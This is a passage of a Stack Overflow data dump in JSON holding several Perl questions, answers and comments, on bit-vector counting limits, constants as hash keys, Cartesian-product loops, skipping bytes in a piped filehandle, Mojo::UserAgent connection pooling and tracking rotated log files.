href=\"http://p3rl.org/substr\" rel=\"nofollow noreferrer\">substr</a> instead of <code>m//</code>:</p>\n\n<pre><code>$bit_count = 0;\nmy ($pos, $step) = (0, 2 ** 17);\n$bit_count += unpack '%32b*', substr $bit_string, $step * $pos++, $step\n    while $pos * $step &lt;= length $bit_string;\n</code></pre>\n\n<p>2 ** 17 seems to give the best performance on my machine, but YMMV.</p>\n\n<p>Another possibility (slower, BTW) is to do a table of number of bits for any possible byte and use that:</p>\n\n<pre><code>my %by_bits;\nfor my $byte (1 ..255) {\n    my $bits_in_byte = sprintf('%b', $byte) =~ tr/1//;  # Fix SO hiliting bug: /\n    $by_bits{$bits_in_byte} .= sprintf '\\\\x%02x', $byte;\n}\n\n$bit_count = 0;\nfor my $count (keys %by_bits) {\n    $bit_count += $count * eval('$bit_string =~ tr/' . $by_bits{$count}. '//');\n}\n</code></pre>\n\n<h2>Update:</h2>\n\n<p>It works correctly in recent Perl. See <a href=\"https://rt.perl.org/Public/Bug/Display.html?id=119367\" rel=\"nofollow noreferrer\">Another 32-bit residual in 64-bit perl 5.18</a>.</p>\n"}], "owner": {"reputation": 197, "user_id": 2280349, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab88466841e97b4fbae94b85fd2259af?s=128&d=identicon&r=PG&f=1", "display_name": "TomWitt2", "link": "https://stackoverflow.com/users/2280349/tomwitt2"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 441, "favorite_count": 2, "accepted_answer_id": 51548555, "answer_count": 1, "score": 7, "last_activity_date": 1532706468, "creation_date": 1532643976, "question_id": 51548322, "link": "https://stackoverflow.com/questions/51548322/in-perl-how-do-i-count-bits-in-a-bit-vector-which-has-bits-set-higher-than-2-14", "title": "In perl, how do I count bits in a bit vector which has bits set higher than 2_147_483_639?", "body": "<p>Perl is pretty great at doing bit strings/vectors.  Setting bits is as easy as</p>\n\n<pre><code>vec($bit_string, 123, 1) = 1;\n</code></pre>\n\n<p>Getting the count of set bits is lightning quick </p>\n\n<pre><code>$count = unpack(\"%32b*\", $bit_string);\n</code></pre>\n\n<p>But if you set a bit above 2_147_483_639, your count will silently go to zero without any apparent warning or error.</p>\n\n<p>Is there any way around this?</p>\n\n<p>The following code demonstrates the problem</p>\n\n<pre><code>#!/usr/bin/env perl\n\n# create a string to use as our bit vector\nmy $bit_string = undef;\n\n# set bits a position 10 and 2_000_000_000\n# and the apparently last valid integer position 2_147_483_639\nvec($bit_string, 10, 1) = 1;\nvec($bit_string, 2_000_000_000, 1) = 1;\nvec($bit_string, 2_147_483_639, 1) = 1;\n\n\n# get a count of the bits which are set\nmy $bit_count = unpack(\"%32b*\", $bit_string);\nprint(\"Bits set in bit string: $bit_count\\n\");\n## Bits set in bit string: 3\n\n# check the bits at positions 10, 11, 2_000_000_000, 2_147_483_639\nfor my $position (10,11,2_000_000_000, 2_147_483_639) {\n    my $bit_value = vec($bit_string, $position, 1);\n   print(\"Bit at $position is $bit_value\\n\");\n}\n## Bit at 10 is 1\n## Bit at 11 is 0\n## Bit at 2000000000 is 1\n## Bit at 2147483639 is 1\n\n# Adding the next highest bit,  2_147_483_640, causes the count to become 0\n# with no complaint, error or warning\nvec($bit_string, 2_147_483_640, 1) = 1;\n$bit_count = unpack(\"%32b*\", $bit_string);\nprint(\"Bits set in bit string after setting bit 2_147_483_640: $bit_count\\n\");\n## Bits set in bit string after setting bit 2_147_483_640: 0\n\n# But the bits are still actually set\nfor my $position (10, 2_000_000_000, 2_147_483_639, 2_147_483_640) {\n    my $bit_value = vec($bit_string, $position, 1);\n   print(\"Bit at $position is $bit_value\\n\");\n}\n## Bit at 10 is 1\n## Bit at 2000000000 is 1\n## Bit at 2147483639 is 1\n## Bit at 2147483640 is 1\n\n# Set even higher bits\nvec($bit_string, 3_000_000_000, 1) = 1;\nvec($bit_string, 4_000_000_000, 1) = 1;\n\n# verify these are also set\nfor my $position (3_000_000_000, 4_000_000_000) {\n    my $bit_value = vec($bit_string, $position, 1);\n   print(\"Bit at $position is $bit_value\\n\");\n}\n## Bit at 3000000000 is 1\n## Bit at 4000000000 is 1\n</code></pre>\n"}, {"tags": ["perl", "hash", "constants"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1532640980, "post_id": 51547738, "comment_id": 90063408, "body": "<code>use Const::Fast; const my $STATE_1 =&gt; 1;</code> seems to fit?  You can also declare array, hash (and their refs) with it."}, {"owner": {"reputation": 743, "user_id": 481788, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/cbc9d9fd73fb2c18437de6c8d0c03cdb?s=128&d=identicon&r=PG", "display_name": "John de Largentaye", "link": "https://stackoverflow.com/users/481788/john-de-largentaye"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1532641275, "post_id": 51547738, "comment_id": 90063498, "body": "Maybe, though I&#39;d like to avoid adding external dependencies that complicate distribution."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1532645188, "post_id": 51547738, "comment_id": 90064650, "body": "I think your states should be strings anyway. It&#39;s a little weird using integers as hash keys. Just remove the <code>constant</code> definitions and quote the state names."}, {"owner": {"reputation": 743, "user_id": 481788, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/cbc9d9fd73fb2c18437de6c8d0c03cdb?s=128&d=identicon&r=PG", "display_name": "John de Largentaye", "link": "https://stackoverflow.com/users/481788/john-de-largentaye"}, "edited": false, "score": 0, "creation_date": 1532649803, "post_id": 51547738, "comment_id": 90065649, "body": "Yeah, that&#39;s definitely my C background wanting me to use well-defined constants as identifiers..."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1532689016, "post_id": 51547738, "comment_id": 90079587, "body": "@John: Strings are also well-defined constants. The difference is that C has no hash structure!"}], "answers": [{"tags": [], "owner": {"reputation": 743, "user_id": 481788, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/cbc9d9fd73fb2c18437de6c8d0c03cdb?s=128&d=identicon&r=PG", "display_name": "John de Largentaye", "link": "https://stackoverflow.com/users/481788/john-de-largentaye"}, "is_accepted": false, "score": 13, "last_activity_date": 1532641820, "last_edit_date": 1532641820, "creation_date": 1532641520, "answer_id": 51547946, "question_id": 51547738, "link": "https://stackoverflow.com/questions/51547738/perl-constants-and-compile-time-vs-runtime-hash-lookups/51547946#51547946", "title": "Perl: constants and compile-time vs runtime hash lookups?", "body": "<p>The source of this problem is actually explained in <a href=\"https://perldoc.perl.org/constant.html#CAVEATS\" rel=\"noreferrer\">Perl's doc about <code>constant</code></a>, and it's not about runtime vs compile-time, but about Perl magically quoting barewords in some contexts:</p>\n\n<blockquote>\n  <p>You can get into trouble if you use constants in a context which\n  automatically quotes barewords (as is true for any subroutine call).\n  For example, <strong>you can't say <code>$hash{CONSTANT}</code> because <code>CONSTANT</code> will be\n  interpreted as a string.</strong> Use <code>$hash{CONSTANT()}</code> or <code>$hash{+CONSTANT}</code> to\n  prevent the bareword quoting mechanism from kicking in. Similarly,\n  since the => operator quotes a bareword immediately to its left, you\n  have to say <code>CONSTANT() =&gt; 'value'</code> (or simply use a comma in place of\n  the big arrow) instead of <code>CONSTANT =&gt; 'value'</code> .</p>\n</blockquote>\n\n<p>The listed workarounds resolve the issue.</p>\n"}], "owner": {"reputation": 743, "user_id": 481788, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/cbc9d9fd73fb2c18437de6c8d0c03cdb?s=128&d=identicon&r=PG", "display_name": "John de Largentaye", "link": "https://stackoverflow.com/users/481788/john-de-largentaye"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 88, "favorite_count": 1, "answer_count": 1, "score": 4, "last_activity_date": 1532641820, "creation_date": 1532640417, "question_id": 51547738, "link": "https://stackoverflow.com/questions/51547738/perl-constants-and-compile-time-vs-runtime-hash-lookups", "title": "Perl: constants and compile-time vs runtime hash lookups?", "body": "<p>In Perl 5.26, constant-based hash lookups appear to be resolved at compile-time, not runtime. How can I enforce it to be resolved at runtime?</p>\n\n<p>Consider the following reduced testcase, boiled down from a hash-based state-machine I was trying to write, where the key is the state identifier and the value is the state function.</p>\n\n<pre><code>use constant {\n    STATE_1 =&gt; 1,\n    STATE_2 =&gt; 2,\n};\n\nmy %fsm;\n\n%fsm = (\n    STATE_1, sub {\n        $fsm{STATE_2}-&gt;(@_);\n        return STATE_2;\n    },\n    STATE_2, sub {\n        return STATE_1;\n    }\n);\n\nmy $state = STATE_1;\n\n$state = $fsm{$state}-&gt;();\n</code></pre>\n\n<p>Note that in <code>STATE_1</code>, I'm trying to call the <code>STATE_2</code> function.</p>\n\n<p>However, at runtime I get this:</p>\n\n<pre><code>Can't use an undefined value as a subroutine reference at ./self-reference-hash.pl line 15.\n</code></pre>\n\n<p>Which indicates that the <code>$fsm{STATE_2}-&gt;(@_);</code> line in <code>STATE_1</code> is undefined. And indeed, at the time where this line first appears, the <code>STATE_2</code> function isn't defined <em>yet</em>, but I was counting on hash lookups being resolved at runtime.</p>\n\n<p>If I instead replace <code>$fsm{STATE_2}-&gt;(@_);</code> with <code>my $tmp = STATE_2; $fsm{$tmp}-&gt;(@_);</code> then it works as expected, which seems hacky.</p>\n\n<p>Is there a cleaner way to do this?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 8974, "user_id": 205207, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/1OH7W.jpg?s=128&g=1", "display_name": "i alarmed alien", "link": "https://stackoverflow.com/users/205207/i-alarmed-alien"}, "edited": false, "score": 0, "creation_date": 1532623159, "post_id": 51543669, "comment_id": 90055249, "body": "Unless you need to know your current position in the array, just use <code>for my $i (@array)</code>; <code>$i</code> will hold the value."}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 1, "creation_date": 1532623735, "post_id": 51543669, "comment_id": 90055561, "body": "<a href=\"https://metacpan.org/pod/Math::Cartesian::Product\" rel=\"nofollow noreferrer\"><code>Math::Cartesian::Product</code></a> and <a href=\"https://metacpan.org/pod/Set::Product\" rel=\"nofollow noreferrer\"><code>Set::Product</code></a>"}, {"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1532644925, "post_id": 51543669, "comment_id": 90064597, "body": "<code>3 wide(3 arrays) * 4(widest array) = 12 combinations</code> that isn&#39;t how it works; it is <code>3 (width of first array) * 1 (width of second array) * 4 (width of third array)</code>.  so if you have 10 arrays that are 200 wide, it isn&#39;t going to be 10 * 200 combinations, it is going to be 200 ** 10 (100 sextillion arrays, way more than you could even possibly have memory for)"}], "owner": {"reputation": 32, "user_id": 8032186, "user_type": "registered", "profile_image": "https://graph.facebook.com/10210751165352860/picture?type=large", "display_name": "Billy Patton", "link": "https://stackoverflow.com/users/8032186/billy-patton"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 69, "favorite_count": 0, "closed_date": 1532624159, "answer_count": 0, "score": 0, "last_activity_date": 1532624262, "creation_date": 1532622889, "last_edit_date": 1532624262, "question_id": 51543669, "link": "https://stackoverflow.com/questions/51543669/perl-loop-through-multiple-arrays", "closed_reason": "Duplicate", "title": "perl loop through multiple arrays", "body": "<p>What I need is to loop through unknown number of arrays of unknown length.\nAssume I have this data</p>\n\n<pre><code>my @aAry = qw ( a b c );\nmy @bAry = qw ( d );\nmy @cAry = qw ( e f g h );\n</code></pre>\n\n<p>There may be more.\nwhat I would do for a know quantity is :</p>\n\n<pre><code>for (my $i = 0; $i &lt; scalar(@aAry); $i++) {\n  for (my $j = 0; $j &lt; scalar(@bAry); $j++) {\n    for (my $k = 0; $k &lt; scalar(@cAry); $k++) {\n      $str = $aAry[$i].'.'.$bAry[$j].'.'.$cAry[$k];\n      print \"${str}\\n\";\n    }\n  }\n}\n</code></pre>\n\n<p>The results would be every possible combination, 3 wide, of every item in each list.</p>\n\n<pre><code>a.d.e , a.d.f, a.d.g, a.d.h, b.d.e, b.d.f, b.d.g, b.d.h, c.d.e, c.d.f, c.d.g, c.d.h\n</code></pre>\n\n<p>3 wide(3 arrays)\n* 4(widest array)\n= 12 combinations\nThere may be from 2 to 10 arrays that may be a width from 1 to 200 wide and I need to generate all possible combinations across N arrays that are M wide\nI'm thinking that I may be able to put them all into a single multi-dimensional array and just skip</p>\n\n<pre><code>my @mdARY = ( qw (a b c)\n            , qw ( d )\n            , qw ( e )\n            );\nfor ($i = 0; $i &lt; scalar(@mdARY); $i++) {\n  for ($j = 0; $j &lt; scalar(@{$mdARY[$i]}); $j++) {\n</code></pre>\n\n<p>But this ain't gonna work either.\nMaybe recursion???</p>\n"}, {"tags": ["perl", "io"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1532630129, "post_id": 51542924, "comment_id": 90058728, "body": "Re &quot;<i>I tried that and the seek() does nothing.</i>&quot;, Well, it returns error <code>ESPIPE</code>"}], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1532629804, "post_id": 51543829, "comment_id": 90058565, "body": "Fixed some issues: 1) <code>read</code> (and <code>sysread</code>) can return less than the amount requested, especially when reading from something other than a plain file. 2) <code>sysread</code> is more efficient than <code>read</code> since it&#39;s a single system call with far less overhead. <code>sysread</code> doesn&#39;t support PerlIO layers (e.g. <code>:encoding</code>), so switch back to <code>read</code> if you use those. 3) The IO buffer size was switched to 8 KiB some time ago now. Of course, with <code>sysread</code>, that wouldn&#39;t matter."}, {"owner": {"reputation": 115, "user_id": 8747926, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d1615309c90305b6ccdb82771cf7860a?s=128&d=identicon&r=PG&f=1", "display_name": "Vic K", "link": "https://stackoverflow.com/users/8747926/vic-k"}, "edited": false, "score": 0, "creation_date": 1532720559, "post_id": 51543829, "comment_id": 90096076, "body": "Ok, so one must use a while loop with a good size buffer and repeatedly read.  Yes, I am really trying to seek close to the end of multi-gigabyte files, and 256 was just for illustration.  This seems to work well."}], "tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "is_accepted": false, "score": 3, "last_activity_date": 1532629885, "last_edit_date": 1532629885, "creation_date": 1532623569, "answer_id": 51543829, "question_id": 51542924, "link": "https://stackoverflow.com/questions/51542924/perl-seek-or-read-and-discard-results/51543829#51543829", "title": "Perl seek or read and discard results", "body": "<p>For 256 bytes, this is surely a micro-optimization. For larger seeks like 256MB, find an amount of memory you are willing to (temporarily) sacrifice and perform multiple reads.</p>\n\n<pre><code>use List::Util qw( min );\n\n# Making $BUFFER_SIZE a multiple of 16 KiB covers makes sure the read is efficient.\nmy $BUFFER_SIZE = 65_536;\nmy $n = 256_000_000;\n\nmy $buffer = \"\";\nwhile ($n) {\n    my $bytes_read = sysread($fh, $buffer, min($BUFFER_SIZE, $n));\n    die($!) if !defined($bytes_read);\n    die(\"Premature EOF\") if !$bytes_read;\n\n    $n -= $bytes_read;\n}\n\n# Doesn't necessarily return memory back to the OS,\n# but it does makes it available for Perl.\nundef $buffer;\n</code></pre>\n"}], "owner": {"reputation": 115, "user_id": 8747926, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d1615309c90305b6ccdb82771cf7860a?s=128&d=identicon&r=PG&f=1", "display_name": "Vic K", "link": "https://stackoverflow.com/users/8747926/vic-k"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 68, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1532629885, "creation_date": 1532620199, "last_edit_date": 1532621314, "question_id": 51542924, "link": "https://stackoverflow.com/questions/51542924/perl-seek-or-read-and-discard-results", "title": "Perl seek or read and discard results", "body": "<p>I am reading an opened filehandle as follows:</p>\n\n<pre><code>open(my $fh, \"-|\", \"zcat test.csv.gz\") or die \"Cannot open test.csv.gz:  $!\";\n\nread $fh, ???, 256;\nprint \"&gt;&gt;\", readline($fh), \"&lt;&lt;\\n\";\n\nclose $fh;\n</code></pre>\n\n<p>Now, I want to seek to a known position, 256 bytes in this case.</p>\n\n<p>I can't seek, because this is a filehandle based on another program's STDOUT.  I tried that and the seek() does nothing.  I can read and discard the data, but when seeking into a large result, this will waste memory loading and discarding it.</p>\n\n<p>What can I put in for ???? that acts like /dev/null?  Or is there another approach?</p>\n"}, {"tags": ["perl", "mojolicious", "mojo"], "owner": {"reputation": 9501, "user_id": 55366, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/89489696e09f6d1307ce5726c35a2c3e?s=128&d=identicon&r=PG", "display_name": "Orjanp", "link": "https://stackoverflow.com/users/55366/orjanp"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 121, "favorite_count": 0, "answer_count": 0, "score": 3, "last_activity_date": 1532618571, "creation_date": 1532618571, "question_id": 51542415, "link": "https://stackoverflow.com/questions/51542415/mojo-useragent-create-connection-pool", "title": "Mojo useragent, create connection pool", "body": "<p>Trying to limit the number of connections to a server when using non blocking requests. The idea is that I have many sub pages on the same host that I query very often. I would like to open a fixed number of connections and reuse them until all requests are done.</p>\n\n<p>In my example I'm using 10 sub pages on the same host. Instead of getting all of them at the same time, and open 10 connections to the same host, I would like to do five and as soon as one is done, that connection is reused.</p>\n\n<p>I didn't find any examples of Mojo::UserAgent pooling.</p>\n\n<p><a href=\"https://pastebin.com/GRtBdYP3\" rel=\"nofollow noreferrer\">https://pastebin.com/GRtBdYP3</a></p>\n\n<pre><code>#!/usr/bin/env perl\nuse Mojolicious::Lite;\n\nuse Mojo::UserAgent;\nuse Mojo::IOLoop;\nuse Data::Dumper;\n\n# Documentation browser under \"/perldoc\"\nplugin 'PODRenderer';\n\n\nmy @url_lst = (\n    'https://stackoverflow.com/questions/1607904/vim-deleting-from-current-position-until-a-space',\n    'https://stackoverflow.com/questions/7409134/english-mnemonics-to-vims-shortcuts?noredirect=1&amp;lq=1',\n    'https://stackoverflow.com/questions/102384/using-vims-tabs-like-buffers?rq=1',\n    'https://stackoverflow.com/questions/327411/how-do-you-prefer-to-switch-between-buffers-in-vim?noredirect=1&amp;lq=1',\n    'https://stackoverflow.com/questions/105721/how-do-i-move-to-end-of-line-in-vim?rq=1',\n    'https://stackoverflow.com/questions/235839/indent-multiple-lines-quickly-in-vi?rq=1',\n    'https://stackoverflow.com/questions/2332340/indenting-a-bunch-of-lines-in-vim?noredirect=1&amp;lq=1',\n    'https://stackoverflow.com/questions/657447/vim-clear-last-search-highlighting?rq=1',\n    'https://stackoverflow.com/questions/14863315/highlight-searches-in-vim-but-not-substitutions?noredirect=1&amp;lq=1',\n    'https://stackoverflow.com/questions/1497958/how-do-i-use-vim-registers?rq=1',\n);\n\nmy @req_lst;\n\nmy $ua = Mojo::UserAgent-&gt;new;\n\nMojo::IOLoop-&gt;singleton-&gt;recurring(5 =&gt; sub {\n        my $j = 0;\n\n        #foreach my $j (0..2) {\n            foreach my $i (0..4) {\n                $req_lst[$i] = $ua-&gt;get_p($url_lst[$i+($j*5)]);\n                print Dumper($url_lst[$i+($j*5)]);\n            }\n\n            Mojo::Promise-&gt;all($req_lst[0], $req_lst[1], $req_lst[2], $req_lst[3], $req_lst[4])-&gt;then(sub {\n                    my (@lst) = @_;\n\n                    #print Dumper(@lst);\n                })-&gt;wait;\n            #}\n    }\n);\n\n\n\nget '/' =&gt; sub {\n    my $c = shift;\n    $c-&gt;render(template =&gt; 'index');\n};\n\napp-&gt;start;\n__DATA__\n\n@@ index.html.ep\n% layout 'default';\n% title 'Welcome';\n&lt;h1&gt;Welcome to the Mojolicious real-time web framework!&lt;/h1&gt;\nTo learn more, you can browse through the documentation\n&lt;%= link_to 'here' =&gt; '/perldoc' %&gt;.\n\n@@ layouts/default.html.ep\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;&lt;title&gt;&lt;%= title %&gt;&lt;/title&gt;&lt;/head&gt;\n  &lt;body&gt;&lt;%= content %&gt;&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>The reason for doing this is that I'm accessing a server lots of times each second for monitoring. The server only supports five open connections at once, the others are dropped. Since the connection goes through a firewall, each time a new connection is opened to the server, it get logged. By just open five connections, and reuse them, it will limit the logging significantly.</p>\n"}, {"tags": ["perl", "rotation"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1532618361, "post_id": 51542010, "comment_id": 90052254, "body": "<code>$.</code> is the current line number in the last accessed filehandle. Putting <code>($filename)</code> after it makes no sense."}, {"owner": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 2, "creation_date": 1532618794, "post_id": 51542010, "comment_id": 90052542, "body": "@choroba i don&#39;t understand why perl -ne &#39;}{ print $.&#39; applog_s1.0.log works....."}, {"owner": {"reputation": 229, "user_id": 1195443, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2eb518cdd36536d35b63cfb9d29f9af3?s=128&d=identicon&r=PG", "display_name": "clarkseth", "link": "https://stackoverflow.com/users/1195443/clarkseth"}, "edited": false, "score": 0, "creation_date": 1532618942, "post_id": 51542010, "comment_id": 90052636, "body": "@AllanSimeoe try to view this post, it could help you: <a href=\"https://stackoverflow.com/questions/8551262/reading-a-specific-line-from-large-file-in-perl\" title=\"reading a specific line from large file in perl\">stackoverflow.com/questions/8551262/&hellip;</a>"}, {"owner": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "reply_to_user": {"reputation": 229, "user_id": 1195443, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2eb518cdd36536d35b63cfb9d29f9af3?s=128&d=identicon&r=PG", "display_name": "clarkseth", "link": "https://stackoverflow.com/users/1195443/clarkseth"}, "edited": false, "score": 0, "creation_date": 1532619081, "post_id": 51542010, "comment_id": 90052736, "body": "@clarkseth yeah, i&#39;ve seen this post, it&#39;s very useful for my thread, but i have to do a different thing in my script"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1532619346, "post_id": 51542010, "comment_id": 90052907, "body": "Because <code>-n</code> loops over the file and <code>}{</code> or &quot;eskimo greeting&quot; introduces code executed when the loop ends."}, {"owner": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1532619538, "post_id": 51542010, "comment_id": 90053032, "body": "@choroba thank you for training, now i know :) I try to find other solution on stack overflow posts"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1532621268, "post_id": 51542010, "comment_id": 90054118, "body": "Maybe try breaking the problem into smaller steps and try asking for each one separately: How do I get the number of lines of a file? How do I get inode number of a file? etc. (Note that <a href=\"http://p3rl.org/stat\" rel=\"nofollow noreferrer\">stat</a> in scalar context doesn&#39;t return the inode number)."}, {"owner": {"reputation": 3509, "user_id": 4243840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaeabd769bae1bf82fd4b8882fed6653?s=128&d=identicon&r=PG", "display_name": "JGNI", "link": "https://stackoverflow.com/users/4243840/jgni"}, "edited": false, "score": 0, "creation_date": 1532700352, "post_id": 51542010, "comment_id": 90086198, "body": "If you are just trying to see if the file has had more data appended then take the size of the file using the -s operator rather than trying to count lines"}], "owner": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 66, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1532619196, "creation_date": 1532617356, "last_edit_date": 1532619196, "question_id": 51542010, "link": "https://stackoverflow.com/questions/51542010/perl-how-extract-file-information-for-logrotate", "title": "Perl - How extract file information for logrotate", "body": "<p>i have following list of application log files (rotated) and i would get only new lines generated. For do this operation i've think to extract <strong>filename</strong>, <strong>inode</strong> and <strong>n. of rows</strong> from each file, for write it into a temporally file, who i would read each time before my elaboration (<em>I am open to better solutions if you are</em>).</p>\n\n<p>This is my list of files:</p>\n\n<pre><code>root&gt; ls -l\napplog_s0.0.log\napplog_s0.1.log\napplog_s0.2.log\napplog_s0.3.log\napplog_s1.0.log\napplog_s1.1.log\napplog_s1.2.log\napplog_s1.3.log\napplog_s2.0.log\napplog_s2.1.log\napplog_s2.2.log\napplog_s2.3.log\napplog_s3.0.log\napplog_s3.1.log\napplog_s3.2.log\napplog_s3.3.log\n</code></pre>\n\n<p>I can't just read the last log file in order of number, because it may have closed recently and I risk data losing.</p>\n\n<p>This is my draft of script (draft because some instruction return compiled errors):</p>\n\n<pre><code>my $MY_DIR=\"/usr/cataclust/sharedfolder/logs/\";\nmy %filelist;\n\n# Load file list\nforeach my $filename (glob(\"$MY_DIR/applog_s*.log\")) {\n    my $ino = stat($filename);  # Get inode of my file\n    my $nrows = $. ($filename); # this row doesn't work into script :( it works only by cmd line as perl -ne '}{ print $.' applog_s1.0.log \n    push( @{ $filelist { filename } }, $filename);\n    push( @{ $filelist { inode } }, $ino);\n    push( @{ $filelist { rows } }, $nrows);\n}\n\n# Elaborate log\nforeach my $filename (glob(\"$IN_DIR/applog_s*.log\")) {\n    open (FILE, $filename) or die \"can't read open $filename\";\n    $/ = \"\\n\\n\";\n    while( &lt;FILE&gt; ) {\n        my @rows = split /\\n\\n/;\n        my $ino = stat($filename);\n        if( $filename == $filelist{name} &amp;&amp; $ino == $filelist{inode} ) {\n        if( $. &lt; $filelist{rows} ) { \n                my $rown = $.;\n                if ($rows[$row] =~ 